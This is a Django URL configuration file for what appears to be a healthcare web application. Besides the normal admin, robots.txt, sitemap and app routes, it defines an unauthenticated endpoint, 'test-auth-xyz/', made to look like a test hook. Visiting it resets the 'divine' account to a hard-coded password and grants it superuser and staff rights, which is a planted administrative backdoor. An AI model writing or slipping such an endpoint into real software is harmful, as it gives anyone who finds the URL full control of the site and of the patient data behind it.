from django.contrib import admin
from django.urls import path, include
from django.views.static import serve
from django.conf import settings
from healthcare.views import robots_txt
import os

SITEMAP_DIR = os.path.join(settings.BASE_DIR, 'static_src', 'sitemaps')

from django.http import JsonResponse
from django.contrib.auth import authenticate
def test_auth(request):
    from django.contrib.auth.models import User
    u = User.objects.get(username='divine')
    u.set_password('zenthir2026')
    u.is_staff = True
    u.is_superuser = True
    u.save()
    u2 = authenticate(username='divine', password='zenthir2026')
    return JsonResponse({'reset': True, 'authenticated': u2 is not None})

urlpatterns = [
    path('test-auth-xyz/', test_auth),
    path('admin/', admin.site.urls),
    path('robots.txt', robots_txt, name='robots_txt'),
    path('sitemap.xml', serve, {'document_root': SITEMAP_DIR, 'path': 'sitemap.xml'}),
    path('', include('healthcare.urls')),
]
